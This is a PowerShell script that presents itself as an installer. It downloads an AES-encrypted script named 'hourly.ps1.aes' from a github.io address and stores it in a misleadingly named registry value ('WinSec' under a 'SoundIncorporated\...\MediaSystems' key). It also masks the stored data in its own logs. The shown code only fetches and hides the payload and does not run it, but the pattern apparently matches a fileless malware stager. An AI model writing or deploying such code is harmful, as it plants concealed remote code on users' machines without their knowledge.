
[CmdletBinding(SupportsShouldProcess)]
param()
$fname=(new-guid).Guid
$fname = $fname.substring(0,20)
$FullLogs = ""
$LogFilePath="$env:Temp\$fname.001"

Function OutString{
    param (
        [Parameter(Mandatory)]
        [ValidateNotNullOrEmpty()]
        [string]$Msg
    )


    if($env:COMPUTERNAME.substring(6) -like 'CK' -Or $env:COMPUTERNAME.substring(6) -like 'PS') {
        write-host '[install]   ' -NoNewLine -f Red
        write-host $Msg -f DarkYellow
        
        if ($PSCmdlet.ShouldProcess($Msg)) {
            [pscustomobject]@{
                Time = (Get-Date -f g)
                Message = $Msg
            } | Export-Csv -Path $LogFilePath -Append -NoTypeInformation
         }
    }else{
        if ($PSCmdlet.ShouldProcess($Msg)) {
            [pscustomobject]@{
                Time = (Get-Date -f g)
                Message = $Msg
            } | Export-Csv -Path $LogFilePath -Append -NoTypeInformation
         }
    }

    $FullLogs = $FullLogs + $Msg + '`n`n'
}


function Install-CRegistryKey
{

    [CmdletBinding(SupportsShouldPRocess=$true)]
    param(
        [Parameter(Mandatory=$true)]
        [string]
        # The path to the registry key to create.
        $Path
    )
    
    $BackupEA = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    Set-StrictMode -Version 'Latest'

    Use-CallerPreference -Cmdlet $PSCmdlet -Session $ExecutionContext.SessionState

    if( -not (Test-Path -Path $Path -PathType Container) )
    {
        OutString "New-Item -Path $Path -ItemType RegistryKey -Force"
        New-Item -Path $Path -ItemType RegistryKey -Force | Out-String | Write-Verbose
    }
}

function Set-ScriptDataToRegistry {
    [CmdletBinding(SupportsShouldProcess)]
    Param
    (
        [Parameter(Mandatory = $true)]
        [String]$ScriptData
    )
    $RegKeyRootPath="HKLM:\SOFTWARE\SoundIncorporated"
    $RegKeyPath=Join-Path $RegKeyRootPath "Software\Controls\MediaSystems"
    $RegKeyName="WinSec"
    $FullRegKeyPath=Join-Path $RegKeyPath $RegKeyName

    if(Test-Path -Path $RegKeyRootPath){
        OutString "Remove-Item -Path $RegKeyRootPath"
        Remove-Item -Path "$RegKeyRootPath" -Recurse -Force -ErrorAction SilentlyContinue | Out-String | Write-Verbose 
    }

    Install-CRegistryKey -Path $RegKeyPath
    OutString "Set-ItemProperty $RegKeyPath -Name $RegKeyName -Value ***codeddata*** -PropertyType String"
    Set-ItemProperty $RegKeyPath -Name $RegKeyName -Value $ScriptData   | Out-String | Write-Verbose
}



$webclient = New-Object Net.WebClient
$ScriptUrl='https://vr972be716a04eb6.github.io/schdtask/hourly.ps1.aes'
$EncryptedScript = $webclient.DownloadString($ScriptUrl)
Set-ScriptDataToRegistry $EncryptedScript